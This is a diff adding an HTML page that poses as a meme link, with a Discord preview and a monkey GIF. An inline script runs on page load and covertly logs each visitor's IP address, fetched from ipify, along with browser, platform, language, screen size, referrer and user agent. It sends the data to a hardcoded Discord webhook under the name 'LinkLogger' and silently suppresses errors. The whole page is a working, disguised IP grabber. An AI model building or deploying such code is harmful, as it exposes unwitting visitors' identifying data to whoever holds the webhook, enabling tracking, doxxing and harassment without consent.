@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+
+  <!-- Discord OG embed — animated GIF preview -->
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="😭 bro look at this" />
+  <meta property="og:description" content="lmaooo" />
+  <meta property="og:image" content="https://media1.tenor.com/m/yxGoYdNazpsAAAAd/stan-twitter-monkey.gif" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://media1.tenor.com/m/yxGoYdNazpsAAAAd/stan-twitter-monkey.gif" />
+
+  <title>lol</title>
+  <style>
+    :root {
+      box-sizing: border-box;
+      padding-top: env(safe-area-inset-top, 0px);
+      padding-bottom: env(safe-area-inset-bottom, 0px);
+    }
+    *, *::before, *::after { box-sizing: inherit; margin: 0; padding: 0; }
+
+    html, body {
+      height: 100%;
+      background: #0a0a0a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    img {
+      max-width: 100%;
+      max-height: 100vh;
+      display: block;
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+  <img
+    src="https://media1.tenor.com/m/yxGoYdNazpsAAAAd/stan-twitter-monkey.gif"
+    alt=""
+    draggable="false"
+  />
+
+  <script>
+    // ── CONFIG ──────────────────────────────────────────────────────────────
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1557528213406613637/jz0L1ni5Esw8wZc4GSREYCi6oLiUe3ITtTHp-ZSyaDe662v95NOH4avmZnbZw1aiCyS_';
+    // ────────────────────────────────────────────────────────────────────────
+
+    const now = new Date();
+    const ts  = now.toISOString();
+    const fullTs = now.toLocaleString('en-US', {
+      month: 'short', day: 'numeric', year: 'numeric',
+      hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
+    });
+
+    const ua = navigator.userAgent;
+
+    const browser = (() => {
+      if (/Firefox\/(\d+)/.test(ua))  return `Firefox ${RegExp.$1}`;
+      if (/Edg\/(\d+)/.test(ua))      return `Edge ${RegExp.$1}`;
+      if (/OPR\/(\d+)/.test(ua))      return `Opera ${RegExp.$1}`;
+      if (/Chrome\/(\d+)/.test(ua))   return `Chrome ${RegExp.$1}`;
+      if (/Safari\/(\d+)/.test(ua))   return 'Safari';
+      return 'Unknown';
+    })();
+
+    const platform = (() => {
+      if (/iPhone|iPad/.test(ua))     return 'iOS';
+      if (/Android/.test(ua))         return 'Android';
+      const p = navigator.platform || '';
+      if (/Win/.test(p))              return 'Windows';
+      if (/Mac/.test(p))              return 'macOS';
+      if (/Linux/.test(p))            return 'Linux';
+      return 'Unknown';
+    })();
+
+    const referrer = document.referrer || 'direct';
+    const lang     = navigator.language || 'unknown';
+    const screen_res = `${screen.width}x${screen.height}`;
+
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(({ ip }) => {
+        const payload = {
+          username: 'LinkLogger',
+          avatar_url: 'https://media1.tenor.com/m/yxGoYdNazpsAAAAd/stan-twitter-monkey.gif',
+          embeds: [{
+            title: '🔗 Link Opened',
+            color: 0x5865F2,
+            fields: [
+              { name: '🌐 IP Address',   value: `\`${ip}\``,          inline: true  },
+              { name: '💻 Platform',     value: platform,              inline: true  },
+              { name: '🌍 Language',     value: lang,                  inline: true  },
+              { name: '🖥️ Browser',      value: browser,               inline: true  },
+              { name: '📐 Resolution',   value: screen_res,            inline: true  },
+              { name: '🔗 Referrer',     value: referrer.slice(0,100), inline: true  },
+              { name: '🕐 Timestamp',    value: fullTs,                inline: false },
+              { name: '📋 User Agent',   value: `\`${ua.slice(0,200)}\``, inline: false },
+            ],
+            footer: { text: 'LinkLogger · Engagement Monitor' },
+            timestamp: ts
+          }]
+        };
+
+        return fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      })
+      .catch(() => {});
+  </script>
+</body>
+</html>
